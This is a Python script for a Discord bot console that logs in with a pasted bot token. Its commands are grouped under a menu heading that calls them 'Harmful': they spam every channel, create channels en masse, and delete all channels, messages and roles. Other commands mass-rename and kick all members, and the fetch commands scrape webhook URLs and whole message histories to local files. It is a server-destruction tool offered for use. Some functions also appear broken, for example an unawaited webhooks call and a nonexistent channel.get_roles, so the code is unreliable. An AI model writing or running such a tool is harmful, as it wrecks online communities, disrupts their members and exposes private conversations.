#| Remote Discord Bot Console
#| Use this to login to a discord bot, and use commands using the console.
#| You can also create your own commands if you want.
#| Dm Vp#0001 on discord for help.
#|
#|
#| Copyright (C) 2022 Vp (https://github.com/herravp)
import os
import sys
import time

if os.name == "nt":
    os.system("cls")
    os.system("title Remote Bot Console")
if os.name == "posix":
    os.system("clear")

def install(package):
    os.system(f"{sys.executable} -m pip install {package}")


def createFolder(directory):
    try:
        if not os.path.exists(directory):
            os.makedirs(directory)
    except OSError:
        print('Error: Creating directory. ' + directory)


try:
    import pyarmor
    import discord
    from discord.ext import commands
    from dpyConsole import Console
    from colorama import Fore
except ModuleNotFoundError:
    install("pyarmor")
    install("discord")
    install("dpyConsole")
    install("colorama")


client = discord.Client()
console = Console(client)

version = "1.0.0b"

print(f"{Fore.GREEN}------------- Remote Bot Console {version} ------------ \t\n")
print(f"{Fore.GREEN}------------ By Vp (https://github.com/herravp) ------------- \t\n")

token = input("Paste the bot token: ")
print("\n")

@client.event
async def on_ready():
    print(f"{Fore.GREEN}Successfully logged in as {client.user.name}#{client.user.discriminator}")
    time.sleep(1)
    print(f"{Fore.GREEN} Commands: \n")
    print(f"{Fore.GREEN} - - - - Fetching - - - - \n")
    print(f"{Fore.GREEN} - fetchpermissions: Fetchs the permissions of all roles.\n")
    print(f"{Fore.GREEN} - fetchwebhooks: Fetches all the webhooks found in channels.\n")
    print(f"{Fore.GREEN} - fetchchannels: Fetches all the channels found in the server.\n")
    print(f"{Fore.GREEN} - fetchmessages: Fetches all the roles found in the server.\n")
    print(f"{Fore.GREEN} - fetchroles: Fetches all the roles found in the server.\n")

    print(f"{Fore.GREEN} - - - - Harmful - - - -\n")
    print(f"{Fore.GREEN} - say: Sends a message to all the channels.\n")
    print(f"{Fore.GREEN} - createchannels: Tries to create the given amount of channels.\n")
    print(f"{Fore.GREEN} - deletechannels: Tries to delete all the channels.\n")
    print(f"{Fore.GREEN} - deletemessages: Tries to delete all the messages.\n")
    print(f"{Fore.GREEN} - deleteroles: Tries to delete all the roles.\n")
    print(f"{Fore.GREEN} - spam: Spams the given amount of messages.\n")
    print(f"{Fore.GREEN} - massnickname: Changes the nickname of all the members.\n")
    print(f"{Fore.GREEN} - kickmembers: Tries to kick all the members.\n")

    print(f"{Fore.GREEN} - - - - Misc - - - - \n")
    print(f"{Fore.GREEN} - createinvite: Creates a invite for all the servers.\n")

    print(f"{Fore.GREEN} - - - -  Console - - - - \n")
    print(f"{Fore.GREEN} - exit: Logs out from the bot and closes the console.\n")


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        print(ctx.command)
    elif isinstance(error, commands.MissingPermissions):
        print(f"{Fore.RED}Bot doesn't have the required permissions to use this command.")
    elif isinstance(error, commands.MemberNotFound):
        print(f"{Fore.RED}Member not found.")
    elif isinstance(error, commands.CommandOnCooldown):
        print(f"{Fore.RED}Command is on cooldown.")
    else:
        print(f"{Fore.RED}Error: " + str(error))

@console.command()
async def fetchpermissions():
    try:
        for guild in client.guilds:
            for role in guild.roles:
                print(f"{Fore.GREEN} Guild: {guild.name} \n")
                print(f"{Fore.GREEN} Role: {role.name} \n")
                for perm in role.permissions:
                    print(f"{Fore.GREEN} {role.name} perms: {perm}\n")
    except Exception as e:
        print(f"{Fore.RED} {str(e)} {Fore.GREEN}\n")

@console.command()
async def fetchwebhooks():
    try:
        print(f"{Fore.GREEN}Fetching webhooks...\n")
        for guild in client.guilds:
            webhook = guild.webhooks()
            for webhook in webhook:
                print(f"{Fore.GREEN}Webhook: {webhook.url} \n")
                print(f"{Fore.GREEN}Webhook Channel: {webhook.channel} \n")
                continue

    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)                    


@console.command()
async def fetchmessages():
    try:
        print("Fetching messages... \n")
        for guild in client.guilds:
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    messages = await channel.history(limit=None).flatten()
                    for message in messages:
                        with open(f"{guild.name}_messages".replace(" ", "_"), "a") as f:
                            f.write(str(message.author) + " || " + str(message.content) + "\n")
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def fetchchannels():
    try:
        print("Fetching channels... \n")
        for guild in client.guilds:
            for channel in guild.channels:
                print(guild.name + " || " + channel.name + " || " + channel.id)
                continue
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def fetchroles():
    try:
        print("Fetching roles... \n")
        for guild in client.guilds:
            for role in guild.roles:
                print(guild.name + " || " + role.name + " || " + role.id)
                continue
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN) 
               
@console.command()
async def say(*args):
    try:
        print("Sending message... \n")
        for channel in client.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                print("Message sent to: " + channel.name)
                await channel.send(" ".join(args))
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def createchannels(amount, name):
    try:
        print("Creating channels... \n")
        for guild in client.guilds:
            for i in range(int(amount)):
                print("Created channel: " + name + "-" + str(i) + " in guild: " + guild.name)
                await guild.create_text_channel(name + "-" + str(i))
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def deletechannels():
    try:
        print("Deleting channels... \n")
        for channel in client.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                print("Deleted channel: " + channel.name)
                await channel.delete()
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def deletemessages():
    try:
        print("Deleting messages... \n")
        for channel in client.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                messages = await channel.history(limit=None).flatten()
                for message in messages:
                    print("Deleted message: " + message.content)
                    await message.delete()
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)  

@console.command()
async def deleteroles():
    try:
        print("Deleting roles... \n")
        for channel in client.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                for role in channel.get_roles():
                    print("Deleted role: " + role.name)
                    await role.delete()
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)         

@console.command()
async def spam(amount, *args):
    try:
        print("Spamming... \n")
        for channel in client.get_all_channels():
            if isinstance(channel, discord.TextChannel):
                for i in range(1, int(amount) + 1):
                    print("Spammed channel: " + channel.name + " in guild: " + channel.guild.name)
                    await channel.send(" ".join(args))
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def massnickname(nickname):
    try:
        print("Changing nickname... \n")
        member = discord.Member
        for guild in client.guilds:
            for member in guild.members:
                print("Changed the nickname for: " + member.name)
                await member.edit(nick=str(nickname))
                continue
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def kickmembers():
    try:
        print("Kicking members... \n")   
        for member in client.get_all_members():
            if isinstance(member, discord.Member):
                print("Kicked: " + member.name + " in " + member.guild.name)
                await member.kick()
                continue
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)     


@console.command()
async def createinvite():
    try:
        print("Creating invite... \n")
        for guild in client.guilds:
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    invite = await channel.create_invite(max_age=10, max_uses=1)
                    print(guild.name + " :")
                    print(channel.name + " || " + invite.url)
    except Exception as e:
        print(Fore.RED + str(e) + Fore.GREEN)

@console.command()
async def exit():
    print("Exiting... \n")
    print(Fore.RESET)
    await client.logout()
    await client.close()
    sys.exit()
                                
                
# Login
console.start()
client.run(token)
